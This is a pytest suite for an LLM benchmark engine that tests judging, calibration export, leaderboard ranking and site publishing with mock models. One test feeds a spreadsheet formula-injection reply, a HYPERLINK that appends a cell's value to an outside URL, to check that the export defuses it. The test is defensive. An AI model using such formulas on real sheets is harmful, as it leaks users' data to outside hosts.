"""The engine end to end: the task, the scorer, calibration and the leaderboard, run on a tiny
benchmark with Inspect's mock model, which returns canned replies. No real model is called."""

import asyncio
import csv
import math
import re
import shutil
import tempfile
import time
import zipfile
from dataclasses import replace
from datetime import datetime
from pathlib import Path
from types import SimpleNamespace
from typing import Any, cast

import pytest
from inspect_ai import eval as inspect_eval
from inspect_ai import eval_retry
from inspect_ai.log import EvalLog
from inspect_ai.model import (
    ChatCompletionChoice,
    ChatMessageAssistant,
    GenerateConfig,
    ModelCost,
    ModelName,
    ModelOutput,
    ModelUsage,
    get_model,
    get_model_info,
)
from inspect_ai.scorer import Target
from inspect_ai.solver import TaskState

import calibration.__main__ as calibration_cli
from benchmark import ROOT, load_benchmark
from calibration.__main__ import compare, export, rescore
from calibration.judge_tests import judge_tests, report
from judges import benchmark_judge
from leaderboard.__main__ import build_site, copy_logs, default_site, holds_run_logs, moved_from, nothing_to_rank
from leaderboard.render import as_html, as_text, missing_text
from leaderboard.results import (
    Result,
    cost_per_1k,
    last_line,
    load_prices,
    load_results,
    provider_effort,
    run_cost,
    settings_label,
)
from task import run_benchmark

CHECKS = """
from judges.checks import reply_check

@reply_check("style", covers="Never say")
def never_says_delve(case, reply):
    if "delve" in reply.lower():
        return "Says delve."
"""


def make_benchmark(folder: Path, cases: int = 1) -> str:
    (folder / "brief.md").write_text("# Sam\nYou are Sam, a developer.")
    (folder / "style.md").write_text('## House style\n- Be brief.\n\n### Never say\n- "delve"')
    (folder / "cases.yaml").write_text(
        "".join(
            f'- id: case-{n}\n  input: "Can you review PR {n}?"\n  target: "Sure, at 3pm."\n  must_haves: Says when\n'
            for n in range(1, cases + 1)
        )
    )
    (folder / "checks.py").write_text(CHECKS)
    shutil.copytree(ROOT / "rubric", folder / "rubric", dirs_exist_ok=True)
    return str(folder)


def run(
    benchmark: str, reply: str, judge_says: list[str], log_dir: Path, judge: str = "mockllm/judge", **options: Any
) -> EvalLog:
    # the model always gives the same reply; the judge gives these answers in order, then nothing
    model = get_model(
        "mockllm/model", custom_outputs=[ModelOutput.from_content("mockllm/model", reply)] * 10, memoize=False
    )
    grader = get_model(
        judge, custom_outputs=[ModelOutput.from_content(judge, text) for text in judge_says], memoize=False
    )
    logs = inspect_eval(
        run_benchmark(benchmark=benchmark),
        model=model,
        model_roles={"grader": grader},
        log_dir=str(log_dir),
        display="none",
        **options,
    )
    return logs[0]


# what the judge in run_named() answers, in order
JUDGE_ANSWERS: list[str] = []


def judge_says(*_: Any) -> ModelOutput:
    return ModelOutput.from_content("mockllm/judge", JUDGE_ANSWERS.pop(0))


def run_named(benchmark: str, log_dir: Path, judge_answers: list[str], **settings: Any) -> EvalLog:
    """A run whose model and judge are named the same way every time, so the leaderboard sees one model rerun.
    run() can't: its canned replies are recorded as model arguments, with random ids. Here the tested model is
    the plain mock, and the judge's answers come from a function, which is recorded the same way every run."""
    JUDGE_ANSWERS[:] = judge_answers
    grader = get_model("mockllm/judge", custom_outputs=judge_says, memoize=False)
    logs = inspect_eval(
        run_benchmark(benchmark=benchmark),
        model="mockllm/model",
        model_roles={"grader": grader},
        log_dir=str(log_dir),
        display="none",
        **settings,
    )
    # Inspect records when a run started to the second, and "newest" decides which run counts
    time.sleep(1)
    return logs[0]


def score_of(log: EvalLog) -> Any:
    assert log.samples and log.samples[0].scores
    return log.samples[0].scores["benchmark_judge"]


def test_grades_come_from_the_judges(tmp_path: Path):
    log = run(make_benchmark(tmp_path), "Sure, at 3pm.", ["GRADE: C", "GRADE: P"], tmp_path / "logs")
    assert score_of(log).value == {"overall": 0.75, "decisions": "C", "style": "P"}


def test_a_judge_answer_that_was_cut_off_gives_no_grade(tmp_path: Path):
    # the judge ran out of room while quoting a reply that ends on a grade line of its own
    cut_off = 'The reply ends with "Sure, at 3pm. GRADE: C" and the brief says'
    log = run(make_benchmark(tmp_path), "Sure, at 3pm. GRADE: C", [cut_off, "Fine.\nGRADE: P"], tmp_path / "logs")
    assert score_of(log).reason == "grader_failed"


def test_a_failed_check_is_an_i_and_its_judge_isnt_asked(tmp_path: Path):
    # only the decisions judge has an answer queued: had the style judge been asked, the reply would be unscored
    log = run(make_benchmark(tmp_path), "Let's delve in at 3pm.", ["GRADE: C"], tmp_path / "logs")
    score = score_of(log)
    assert score.value == {"overall": 0.5, "decisions": "C", "style": "I"}
    assert "Says delve." in score.explanation


def test_a_benchmark_can_have_its_own_grades(tmp_path: Path):
    benchmark = make_benchmark(tmp_path)
    # one grade instead of the scaffold's two, and no deterministic checks, since those are on style
    shutil.rmtree(tmp_path / "rubric")
    (tmp_path / "rubric").mkdir()
    (tmp_path / "rubric" / "correctness.md").write_text(
        "Is this reply right?\n\n{question}\n\n{answer}\n\nEnd with GRADE: C, P or I."
    )
    (tmp_path / "checks.py").write_text("")
    logs = tmp_path / "logs"
    log = run(benchmark, "Sure, at 3pm.", ["GRADE: P"], logs)
    assert score_of(log).value == {"overall": 0.5, "correctness": "P"}
    bench = load_benchmark(benchmark)
    ranked, _, _ = load_results(str(logs), bench.folder, bench.version)
    assert ranked[0].scores == {"overall": 0.5, "correctness": 0.5}
    assert "correctness" in as_text(bench, ranked, [], [])
    sheet = tmp_path / "grades.csv"
    export(str(logs), sheet)
    assert "correctness" in (csv.DictReader(sheet.open(encoding="utf-8-sig")).fieldnames or [])


@pytest.mark.parametrize("judge", ["mockllm/model", "mockllm/through-another-provider/model"])
def test_the_judge_cant_be_the_tested_model(tmp_path: Path, judge: str):
    # the same model through another provider is still the same model
    log = run(make_benchmark(tmp_path), "Sure, at 3pm.", [], tmp_path / "logs", judge=judge)
    assert log.status == "error" and log.error and "would grade its own replies" in log.error.message


def test_no_judge_in_a_panel_can_be_the_tested_model(tmp_path: Path):
    # with a panel, every judge grades, so the tested model can't be any of them
    log = inspect_eval(
        run_benchmark(benchmark=make_benchmark(tmp_path)),
        model="mockllm/model",
        model_roles={"grader": ["mockllm/judge", "mockllm/model"]},
        log_dir=str(tmp_path / "logs"),
        display="none",
    )[0]
    assert log.status == "error" and log.error and "would grade its own replies" in log.error.message


def test_calibration_matches_your_grades_to_the_replies(tmp_path: Path, capsys: Any):
    logs = tmp_path / "logs"
    run(make_benchmark(tmp_path), "Sure, at 3pm.", ["GRADE: C", "GRADE: P"], logs)
    sheet = tmp_path / "grades.csv"
    export(str(logs), sheet)
    rows = list(csv.DictReader(sheet.open(encoding="utf-8-sig")))
    for row in rows:
        row["decisions"], row["style"] = "C", "C"
    # saved with a byte-order mark, as Excel's "CSV UTF-8" does
    with sheet.open("w", newline="", encoding="utf-8-sig") as file:
        writer = csv.DictWriter(file, fieldnames=list(rows[0]))
        writer.writeheader()
        writer.writerows(rows)
    compare(sheet, str(logs))
    lines = capsys.readouterr().out.splitlines()
    assert "You vs the benchmark, on 1 replies" in lines
    # agreement: you and the judge both said C for decisions, but C and P for style
    assert any(line.startswith("decisions") and line.split()[1] == "1/1" for line in lines)
    assert any(line.startswith("style") and line.split()[1] == "0/1" for line in lines)


@pytest.mark.parametrize("out", ["logs", "logs/rescored"])
def test_rescore_never_writes_over_the_runs_it_regrades(tmp_path: Path, out: str):
    # re-graded copies replace what's in --out, so an --out in the input folder would delete the runs first
    logs = tmp_path / "logs"
    run(make_benchmark(tmp_path), "Sure, at 3pm.", ["GRADE: C"] * 2, logs)
    runs = sorted(logs.glob("*.eval"))
    with pytest.raises(SystemExit, match="would delete the ones it's about to re-grade"):
        rescore(str(logs), tmp_path / out)
    assert sorted(logs.glob("*.eval")) == runs and all(path.exists() for path in runs)


def test_mistakes_get_a_plain_message_before_anything_runs(tmp_path: Path, monkeypatch: Any):
    benchmark = make_benchmark(tmp_path)
    (tmp_path / "judge_tests.yaml").write_text('- case: case-1\n  reply: "Maybe."\n  decision: I\n')

    def no_inspect(*_: Any, **__: Any) -> None:
        raise AssertionError("Inspect was started, which would have called the judge")

    monkeypatch.setattr("calibration.__main__.subprocess.run", no_inspect)
    with pytest.raises(SystemExit, match='"decision", which judge tests don\'t use. Did you mean "decisions"'):
        # called through its module: imported by name, pytest would take test_judges for a test
        calibration_cli.test_judges(benchmark, str(tmp_path / "judge-logs"))
    with pytest.raises(SystemExit, match="doesn't exist"):
        compare(tmp_path / "grades.csv", str(tmp_path / "no-such-folder"))


def test_a_moved_benchmark_is_named_as_the_cause(tmp_path: Path):
    logs = tmp_path / "logs"
    (tmp_path / "before").mkdir()
    benchmark = make_benchmark(tmp_path / "before")
    run(benchmark, "Sure, at 3pm.", ["GRADE: C"] * 2, logs)
    # judge tests of the same files don't record a benchmark, so they never count as a move
    run_judge_tests(benchmark, ["GRADE: C"] * 2, logs)
    assert moved_from(str(logs), load_benchmark(benchmark)) is None, "nothing has moved yet"
    shutil.move(tmp_path / "before", tmp_path / "after")
    assert moved_from(str(logs), load_benchmark(str(tmp_path / "after"))) == benchmark


def test_an_empty_leaderboard_names_the_benchmarks_the_folder_has(tmp_path: Path):
    mine, other, logs = tmp_path / "mine", tmp_path / "other", tmp_path / "logs"
    mine.mkdir()
    other.mkdir()
    run(make_benchmark(other), "Sure, at 3pm.", ["GRADE: C"] * 2, logs)
    hint = nothing_to_rank(str(logs), make_benchmark(mine), "python -m leaderboard")
    assert f"has runs of {load_benchmark(str(other)).folder}" in hint and "--benchmark" in hint


def test_calibration_keys_stay_text_in_a_spreadsheet(tmp_path: Path, capsys: Any):
    logs = tmp_path / "logs"
    run(make_benchmark(tmp_path, cases=2), "Sure, at 3pm.", ["GRADE: C"] * 4, logs, max_samples=1)
    sheet = tmp_path / "grades.csv"
    export(str(logs), sheet)
    rows = list(csv.DictReader(sheet.open(encoding="utf-8-sig")))
    # a letter that can't be part of a number, so no spreadsheet app turns a key like 1234567e89 into 1.23E+95
    assert all(row["key"][0].isalpha() and row["key"][0] not in "abcdef" for row in rows)
    for row in rows:
        row["decisions"], row["style"] = "C", "C"
    # a sheet exported before keys had the letter still matches
    rows[0]["key"] = rows[0]["key"][1:]
    with sheet.open("w", newline="", encoding="utf-8-sig") as file:
        writer = csv.DictWriter(file, fieldnames=list(rows[0]))
        writer.writeheader()
        writer.writerows(rows)
    compare(sheet, str(logs))
    assert "on 2 replies" in capsys.readouterr().out


def test_a_reply_never_runs_as_a_formula_in_the_calibration_sheet(tmp_path: Path, capsys: Any):
    logs = tmp_path / "logs"
    reply = '=HYPERLINK("https://example.com/?q="&C2,"Sure, at 3pm.")'
    run(make_benchmark(tmp_path), reply, ["GRADE: C"] * 2, logs)
    sheet = tmp_path / "grades.csv"
    export(str(logs), sheet)
    rows = list(csv.DictReader(sheet.open(encoding="utf-8-sig")))
    assert rows[0]["reply"] == "'" + reply and rows[0]["must_haves"] == "• Says when"
    rows[0]["decisions"], rows[0]["style"] = "C", "C"
    with sheet.open("w", newline="", encoding="utf-8-sig") as file:
        writer = csv.DictWriter(file, fieldnames=list(rows[0]))
        writer.writeheader()
        writer.writerows(rows)
    compare(sheet, str(logs))
    assert "on 1 replies" in capsys.readouterr().out, "the apostrophe doesn't stop your grade matching the reply"


def test_calibration_never_compares_your_grade_with_a_different_reply(tmp_path: Path, capsys: Any):
    benchmark = make_benchmark(tmp_path, cases=2)
    logs = tmp_path / "logs"
    run(benchmark, "Sure, at 3pm.", ["GRADE: C"] * 4, logs, max_samples=1)
    sheet = tmp_path / "grades.csv"
    export(str(logs), sheet)
    rows = list(csv.DictReader(sheet.open(encoding="utf-8-sig")))
    for row in rows:
        row["decisions"], row["style"] = "C", "C"
    # as if this row was graded on an earlier run whose reply was different
    rows[0]["reply"] = "Maybe next week."
    with sheet.open("w", newline="", encoding="utf-8-sig") as file:
        writer = csv.DictWriter(file, fieldnames=list(rows[0]))
        writer.writeheader()
        writer.writerows(rows)
    compare(sheet, str(logs))
    out = capsys.readouterr().out
    assert "on 1 replies" in out and "1 graded rows had no matching reply" in out
    # a second run of the same model makes every match ambiguous
    run(benchmark, "Sure, at 4pm.", ["GRADE: C"] * 4, logs, max_samples=1)
    with pytest.raises(SystemExit, match="more than one run of mockllm/model"):
        compare(sheet, str(logs))


def test_the_leaderboard_ranks_complete_runs_only(tmp_path: Path):
    benchmark = make_benchmark(tmp_path, cases=2)
    logs = tmp_path / "logs"
    run(benchmark, "Sure, at 3pm.", ["GRADE: C"] * 4, logs)
    # a newer one-case test run of the same model and judge mustn't replace the full run
    run(benchmark, "Sure, at 3pm.", ["GRADE: C"] * 2, logs, limit=1)
    bench = load_benchmark(benchmark)
    ranked, _, partial = load_results(str(logs), bench.folder, bench.version)
    assert [result.cases for result in ranked] == [2]
    assert [result.cases for result in partial] == [1]


def test_a_run_with_ungraded_replies_isnt_ranked(tmp_path: Path):
    benchmark = make_benchmark(tmp_path)
    logs = tmp_path / "logs"
    run(benchmark, "Sure, at 3pm.", ["GRADE: C"] * 4, logs, epochs=2, max_samples=1)
    # the second epoch's judges answer without a grade. Inspect leaves that reply out of the average,
    # and the log's summary still counts no unscored samples, since the case's other epoch was graded
    run(benchmark, "Sure, at 3pm.", ["GRADE: P"] * 2 + ["I can't grade this."] * 2, logs, epochs=2, max_samples=1)
    bench = load_benchmark(benchmark)
    ranked, _, partial = load_results(str(logs), bench.folder, bench.version)
    assert [result.scores["overall"] for result in ranked] == [1.0], "the older, fully graded run keeps its place"
    assert [result.ungraded for result in partial] == [1]


def test_a_run_whose_replies_were_cut_off_isnt_ranked(tmp_path: Path):
    benchmark = make_benchmark(tmp_path)
    # every reply hits the token limit, so the judges would grade replies the model never finished
    run(benchmark, "Sure, at 3pm.", ["GRADE: I"] * 2, tmp_path / "logs", token_limit=1)
    bench = load_benchmark(benchmark)
    ranked, _, partial = load_results(str(tmp_path / "logs"), bench.folder, bench.version)
    assert not ranked and [result.cut_off for result in partial] == [1]
    assert "cut off by a limit" in missing_text(partial[0], bench)


def test_a_run_that_stopped_with_an_error_is_listed_not_ranked(tmp_path: Path):
    benchmark = make_benchmark(tmp_path)
    logs = tmp_path / "logs"
    run(benchmark, "Sure, at 3pm.", ["GRADE: C"] * 2, logs)
    # stops before any reply is written, since the judge is the model being tested
    run(benchmark, "Sure, at 3pm.", [], logs, judge="mockllm/model")
    bench = load_benchmark(benchmark)
    ranked, _, partial = load_results(str(logs), bench.folder, bench.version)
    assert len(ranked) == 1, "the earlier run keeps its place"
    assert [result.status for result in partial] == ["error"]
    assert (
        "stopped with an error" in as_text(bench, ranked, [], partial)
        and "would grade its own replies" in partial[0].error
    )


def test_the_site_publishes_only_the_ranked_runs(tmp_path: Path):
    public, private, logs = tmp_path / "public", tmp_path / "private", tmp_path / "logs"
    public.mkdir()
    private.mkdir()
    run(make_benchmark(public), "Sure, at 3pm.", ["GRADE: C"] * 2, logs)
    # in the same folder: a run that was never graded, and another benchmark's run, with its own brief
    run(str(public), "Sure, at 3pm.", [], logs, score=False)
    run(make_benchmark(private), "Sure, at 3pm.", ["GRADE: C"] * 2, logs)
    bench = load_benchmark(str(public))
    ranked, _, partial = load_results(str(logs), bench.folder, bench.version)
    assert [result.ungraded for result in partial] == [1], "the run made with --no-score is listed, not ranked"
    published = tmp_path / "published"
    published.mkdir()
    copy_logs(ranked, published)
    assert [path.name for path in published.iterdir()] == [Path(ranked[0].location).name]


def test_settings_that_change_replies_get_their_own_row(tmp_path: Path):
    benchmark = make_benchmark(tmp_path)
    logs = tmp_path / "logs"
    run_named(benchmark, logs, ["GRADE: C"] * 2)
    run_named(benchmark, logs, ["GRADE: P"] * 2, reasoning_effort="low")
    # retries change how a run is carried out, not the replies, so this one replaces the first run
    run_named(benchmark, logs, ["GRADE: I"] * 2, max_retries=2)
    bench = load_benchmark(benchmark)
    ranked, _, _ = load_results(str(logs), bench.folder, bench.version)
    assert [(result.name, result.effort, result.scores["overall"]) for result in ranked] == [
        ("mockllm/model", "low", 0.5),
        ("mockllm/model", "default", 0.0),
    ]
    # the effort has its own column, so lists without one name it
    assert [result.label for result in ranked] == ["mockllm/model (effort: low)", "mockllm/model"]


def test_runs_of_an_earlier_version_are_listed_until_rerun(tmp_path: Path):
    benchmark = make_benchmark(tmp_path)
    logs = tmp_path / "logs"
    run_named(benchmark, logs, ["GRADE: C"] * 2)
    # any change to the brief makes a new version of the benchmark
    (tmp_path / "brief.md").write_text("# Sam\nYou are Sam, a senior developer.")
    bench = load_benchmark(benchmark)
    ranked, outdated, _ = load_results(str(logs), bench.folder, bench.version)
    assert not ranked and [result.name for result in outdated] == ["mockllm/model"]
    run_named(benchmark, logs, ["GRADE: C"] * 2)
    ranked, outdated, _ = load_results(str(logs), bench.folder, bench.version)
    assert len(ranked) == 1 and not outdated, "re-running the model takes it off the out-of-date list"


# every reply fails a check on both grades, so the judges are never asked
GATES = """
from judges.checks import reply_check

@reply_check("decisions")
def fails_decisions(case, reply):
    return "Fails."

@reply_check("style")
def fails_style(case, reply):
    {broken}return "Fails."
"""


def test_a_retry_after_an_edit_isnt_ranked(tmp_path: Path):
    benchmark = make_benchmark(tmp_path, cases=2)
    # the second case's check breaks, so the run stops with only the first reply graded
    (tmp_path / "checks.py").write_text(
        GATES.format(broken='if case.id == "case-2":\n        raise RuntimeError("broken")\n    ')
    )
    logs = tmp_path / "logs"
    first = inspect_eval(
        run_benchmark(benchmark=benchmark),
        model="mockllm/model",
        model_roles={"grader": "mockllm/judge"},
        log_dir=str(logs),
        display="none",
        max_samples=1,
    )[0]
    assert first.status == "error"
    # fixing the check is an edit, so the retry runs under a new version but keeps the first case's reply
    (tmp_path / "checks.py").write_text(GATES.format(broken=""))
    assert eval_retry(first, log_dir=str(logs), display="none")[0].status == "success"
    bench = load_benchmark(benchmark)
    ranked, outdated, partial = load_results(str(logs), bench.folder, bench.version)
    assert not ranked and not outdated and [result.other_version for result in partial] == [1]
    assert "replies from two versions" in missing_text(partial[0], bench)


def test_a_case_removed_since_the_run_is_left_ungraded(tmp_path: Path):
    # re-grading an old run after a case was removed: there's no case left to grade its replies against
    scorer = benchmark_judge(benchmark=make_benchmark(tmp_path))
    state = TaskState(
        model=ModelName("mockllm/model"),
        sample_id="case-removed-since",
        epoch=1,
        input="Can you review PR 9?",
        messages=[],
        output=ModelOutput.from_content("mockllm/model", "Sure, at 3pm."),
    )
    score = asyncio.run(scorer(state, Target("")))
    assert score is not None and score.reason == "case_removed"
    assert isinstance(score.value, float) and math.isnan(score.value), (
        "left out of the averages, like any unscored reply"
    )


def test_a_case_whose_input_changed_since_the_run_is_left_ungraded(tmp_path: Path):
    # re-grading an old run after a case's input was rewritten under the same id: the reply answers the old one
    scorer = benchmark_judge(benchmark=make_benchmark(tmp_path))
    state = TaskState(
        model=ModelName("mockllm/model"),
        sample_id="case-1",
        epoch=1,
        input="Can you review PR 9 by Friday?",
        messages=[],
        output=ModelOutput.from_content("mockllm/model", "Sure, at 3pm."),
    )
    score = asyncio.run(scorer(state, Target("")))
    assert score is not None and score.reason == "case_changed"


def test_the_site_never_publishes_your_local_path(tmp_path: Path):
    benchmark = make_benchmark(tmp_path)
    run(benchmark, "Sure, at 3pm.", ["GRADE: C"] * 2, tmp_path / "logs")
    bench = load_benchmark(benchmark)
    ranked, outdated, _ = load_results(str(tmp_path / "logs"), bench.folder, bench.version)
    site = tmp_path / "site"
    # a real bundle, so the test notices if Inspect changes where it records the absolute path
    build_site(bench, ranked, outdated, site, viewer=True)
    viewer = (site / "viewer" / "index.html").read_text(encoding="utf-8")
    assert "abs_log_dir" not in viewer and tempfile.gettempdir() not in viewer
    # Inspect's viewer asks search engines not to index it, wherever the site is hosted
    assert re.search(r'<meta name="robots" content="noindex', viewer)
    assert len(list((site / "viewer").rglob("*.eval"))) == 1 and (site / "index.html").exists()
    # nor in the published run, where the benchmark's path turns up in several fields
    published = next((site / "viewer").rglob("*.eval"))
    with zipfile.ZipFile(published) as bundle:
        text = "".join(bundle.read(name).decode("utf-8", "replace") for name in bundle.namelist())
    for local in {str(tmp_path), str(tmp_path.resolve()), str(ROOT), str(Path.home())}:
        assert local not in text, local


def test_the_viewer_is_skipped_while_no_run_is_ranked(tmp_path: Path):
    # after any change to the benchmark, every run is out of date, so the viewer would have nothing to show
    benchmark = make_benchmark(tmp_path)
    run(benchmark, "Sure, at 3pm.", ["GRADE: C"] * 2, tmp_path / "logs")
    bench = load_benchmark(benchmark)
    ranked, outdated, _ = load_results(str(tmp_path / "logs"), bench.folder, bench.version)
    site = tmp_path / "site"
    build_site(bench, ranked, outdated, site, viewer=True)
    build_site(bench, [], ranked, site, viewer=True)
    assert not (site / "viewer").exists(), "an earlier viewer would publish replies the page no longer ranks"
    assert "Browse every reply" not in (site / "index.html").read_text(encoding="utf-8")


def test_the_site_is_only_the_leaderboard_unless_you_add_the_viewer(tmp_path: Path):
    benchmark = make_benchmark(tmp_path)
    run(benchmark, "Sure, at 3pm.", ["GRADE: C"] * 2, tmp_path / "logs")
    bench = load_benchmark(benchmark)
    ranked, outdated, _ = load_results(str(tmp_path / "logs"), bench.folder, bench.version)
    site = tmp_path / "site"
    build_site(bench, ranked, outdated, site, viewer=True)
    assert "Browse every reply" in (site / "index.html").read_text(encoding="utf-8")
    # a site's own copies of its runs don't stop it being rebuilt, unlike a folder of runs passed by mistake
    assert not holds_run_logs(site) and holds_run_logs(tmp_path / "logs")
    # built again without it, an earlier viewer would still publish every reply, unlinked
    build_site(bench, ranked, outdated, site, viewer=False)
    assert not (site / "viewer").exists() and "Browse every reply" not in (site / "index.html").read_text(
        encoding="utf-8"
    )


def test_private_settings_never_reach_the_site(tmp_path: Path):
    benchmark = make_benchmark(tmp_path)
    logs = tmp_path / "logs"
    secrets = ["sk-test-a-key-that-must-stay-private", "sam@example.com", "internal.example.net"]
    model = get_model(
        "mockllm/model",
        custom_outputs=[ModelOutput.from_content("mockllm/model", "Sure, at 3pm.")],
        api_key=secrets[0],
        base_url=f"https://{secrets[2]}",
        memoize=False,
    )
    grader = get_model("mockllm/judge", custom_outputs=[ModelOutput.from_content("mockllm/judge", "GRADE: C")] * 2)
    inspect_eval(
        run_benchmark(benchmark=benchmark),
        model=model,
        model_roles={"grader": grader},
        log_dir=str(logs),
        display="none",
        extra_body={"user": secrets[1]},
    )
    bench = load_benchmark(benchmark)
    ranked, outdated, _ = load_results(str(logs), bench.folder, bench.version)
    site = tmp_path / "site"
    build_site(bench, ranked, outdated, site, viewer=True)
    published = b""
    for path in site.rglob("*"):
        if path.suffix == ".eval":
            with zipfile.ZipFile(path) as archive:
                published += b"".join(archive.read(name) for name in archive.namelist())
        elif path.is_file():
            published += path.read_bytes()
    assert not [secret for secret in secrets if secret.encode() in published]


def test_each_benchmark_gets_its_own_site_folder():
    # so building Davidness's site never overwrites yours
    assert default_site(load_benchmark("examples/davidness")) == Path("site/davidness")
    assert default_site(load_benchmark(".")) != default_site(load_benchmark("examples/davidness"))


def test_an_older_partial_run_goes_once_the_model_is_ranked(tmp_path: Path):
    benchmark = make_benchmark(tmp_path, cases=2)
    logs = tmp_path / "logs"
    run_named(benchmark, logs, ["GRADE: C"] * 2, limit=1)
    run_named(benchmark, logs, ["GRADE: C"] * 4)
    bench = load_benchmark(benchmark)
    ranked, _, partial = load_results(str(logs), bench.folder, bench.version)
    assert len(ranked) == 1 and not partial, "the old one-case run no longer asks to be re-run"


def test_a_providers_own_error_message_is_what_the_leaderboard_shows():
    # the provider's explanation sits inside an error object, after the whole request
    error = (
        '{"model": "claude-opus-5-5", "max_tokens": 8192}\\n'
        "BadRequestError(\"Error code: 400 - {\\'type\\': \\'error\\', \\'error\\': {\\'type\\': \\'invalid_request_error\\', "
        "\\'message\\': \\'Your credit balance is too low to access the Anthropic API.\\'}, \\'request_id\\': \\'req_1\\'}\")"
    )
    assert last_line(error) == "Your credit balance is too low to access the Anthropic API."


def test_replies_that_stopped_with_an_error_are_named_as_such(tmp_path: Path):
    bench = load_benchmark(make_benchmark(tmp_path))
    result = Result(
        "m", "j", cases=1, epochs=3, run_date=datetime(2026, 10, 12), version="v", scores={}, completed=2, total=3
    )
    assert missing_text(result, bench) == "1 of its 3 replies stopped with an error"


def test_the_default_effort_is_named_when_the_provider_reports_it():
    # OpenAI's replies say which effort they used when the run set none
    event = SimpleNamespace(
        event="model", role=None, call=SimpleNamespace(response={"reasoning": {"effort": "medium"}})
    )
    assert provider_effort(cast(Any, SimpleNamespace(samples=[SimpleNamespace(events=[event])]))) == "medium"
    result = Result(
        model="openai/gpt-6-luna", judge="judge", cases=1, epochs=1, run_date=datetime.now(), version="v", scores={}
    )
    assert result.effort_text == "default", "a provider that doesn't say leaves it plain"
    assert replace(result, provider_effort="medium").effort_text == "medium (default)"
    assert replace(result, effort="xhigh").effort_text == "xhigh"


def test_settings_that_change_the_score_or_the_bill_get_a_label():
    assert settings_label(None, None, None, reducer=["max"]) == "epochs reducer: max"
    assert settings_label(None, None, None, reducer=["mean"]) == "", "the default needs no label"
    assert "batch" in settings_label(GenerateConfig(batch=True), None, None)
    assert "fallback models" in settings_label(GenerateConfig(fallback_models=["openai/gpt-6-luna"]), None, None)


def test_a_cached_rerun_keeps_its_cost(tmp_path: Path, monkeypatch: Any):
    monkeypatch.setenv("INSPECT_CACHE_DIR", str(tmp_path / "cache"))
    benchmark = make_benchmark(tmp_path)
    prices = {"mockllm/model": ModelCost(input=1.0, output=2.0, input_cache_write=1.0, input_cache_read=0.1)}

    def reply(*_: Any) -> ModelOutput:
        usage = ModelUsage(input_tokens=1000, output_tokens=500, total_tokens=1500)
        message = ChatMessageAssistant(content="Sure, at 3pm.")
        return ModelOutput(model="mockllm/model", choices=[ChatCompletionChoice(message=message)], usage=usage)

    costs = []
    for _ in range(2):
        model = get_model("mockllm/model", custom_outputs=reply, memoize=False)
        grader = get_model("mockllm/judge", custom_outputs=[ModelOutput.from_content("mockllm/judge", "GRADE: C")] * 2)
        log = inspect_eval(
            run_benchmark(benchmark=benchmark),
            model=model,
            model_roles={"grader": grader},
            log_dir=str(tmp_path / "logs"),
            display="none",
            cache=True,
        )[0]
        costs.append(cost_per_1k(log, prices))
    # the second run's replies all came from the cache, which leaves them out of the run's own total
    assert costs == [2.0, 2.0]


def test_turning_off_the_judges_prompt_cache_keeps_it_the_same_judge(tmp_path: Path):
    benchmark = make_benchmark(tmp_path)
    logs = tmp_path / "logs"
    for config in [GenerateConfig(), GenerateConfig(cache_prompt=False)]:
        JUDGE_ANSWERS[:] = ["GRADE: C"] * 2
        grader = get_model("mockllm/judge", custom_outputs=judge_says, config=config, memoize=False)
        log = inspect_eval(
            run_benchmark(benchmark=benchmark),
            model="mockllm/model",
            model_roles={"grader": grader},
            log_dir=str(logs),
            display="none",
        )[0]
        time.sleep(1)
    assert log.samples
    judge_calls = [event for event in log.samples[0].events if event.event == "model" and event.role == "grader"]
    assert judge_calls and all(event.config.cache_prompt is False for event in judge_calls)
    bench = load_benchmark(benchmark)
    ranked, _, _ = load_results(str(logs), bench.folder, bench.version)
    assert len(ranked) == 1, "the second run replaces the first, since it's the same model and the same judge"


def test_private_settings_only_show_as_a_fingerprint():
    label = settings_label(
        GenerateConfig(extra_body={"user": "sam@example.com"}), {"api_key": "secret"}, "https://internal"
    )
    assert label.startswith("custom model args #")
    assert not any(private in label for private in ["sam@example.com", "secret", "internal", "api_key"])


def test_each_judge_ranks_only_its_own_runs(tmp_path: Path):
    bench = load_benchmark(make_benchmark(tmp_path))

    def result(model: str, judge: str, score: float) -> Result:
        scores = {"overall": score, "decisions": score, "style": score}
        return Result(
            model, judge, cases=1, epochs=1, run_date=datetime(2026, 10, 3), version=bench.version, scores=scores
        )

    page = as_html(bench, [result("a", "judge-1", 0.9), result("b", "judge-2", 0.8), result("c", "judge-1", 0.7)], [])
    assert page.count("<h2>Judged by") == 2
    assert page.count("<tr><td>1</td>") == 2, "each judge's table ranks from 1"


def run_judge_tests(benchmark: str, judge_says: list[str], log_dir: Path) -> EvalLog:
    grader = get_model(
        "mockllm/judge",
        custom_outputs=[ModelOutput.from_content("mockllm/judge", text) for text in judge_says],
        memoize=False,
    )
    # one at a time, so the judge's answers go to the replies in order: the golden answer, then the known bad one
    logs = inspect_eval(
        judge_tests(benchmark=benchmark),
        model="mockllm/model",
        model_roles={"grader": grader},
        log_dir=str(log_dir),
        max_samples=1,
        display="none",
    )
    return logs[0]


def test_judge_tests_report_grades_that_differ_from_yours(tmp_path: Path):
    benchmark = make_benchmark(tmp_path)
    (tmp_path / "judge_tests.yaml").write_text(
        '- case: case-1\n  reply: "Maybe next week."\n  decisions: I\n  why: no time given\n'
    )
    text, passed = report(
        run_judge_tests(benchmark, ["GRADE: C", "GRADE: C", "GRADE: I", "GRADE: C"], tmp_path / "pass"), "pass"
    )
    assert passed and "2 of 2" in text
    text, passed = report(
        run_judge_tests(benchmark, ["GRADE: C", "GRADE: C", "GRADE: C", "GRADE: C"], tmp_path / "fail"), "fail"
    )
    assert not passed and "1 of 2" in text and "case-1 (no time given): decisions expected I, got C" in text
    assert "inspect view --log-dir fail" in text, "the judge tests' runs aren't in the folder inspect view opens"


def test_cost_comes_from_the_log_or_from_prices(tmp_path: Path):
    log = run(make_benchmark(tmp_path), "Sure, at 3pm.", ["GRADE: C", "GRADE: C"], tmp_path / "logs")
    assert log.stats.model_usage is not None
    usage = ModelUsage(input_tokens=1000, output_tokens=500, total_tokens=1500)
    # the run's own total and its replies' usage, which agree in a real run
    log.stats.model_usage["mockllm/model"] = usage
    for sample in log.samples or []:
        for event in sample.events:
            if event.event == "model" and event.role is None:
                event.output.usage = usage
    prices = {"mockllm/model": ModelCost(input=1.0, output=2.0, input_cache_write=1.0, input_cache_read=0.1)}
    # one reply, costing 1,000 input tokens at $1 a million plus 500 output tokens at $2 a million
    assert cost_per_1k(log, prices) == 2.0
    assert run_cost(log, prices) == 0.002
    log.stats.model_usage["mockllm/model"].total_cost = 0.005
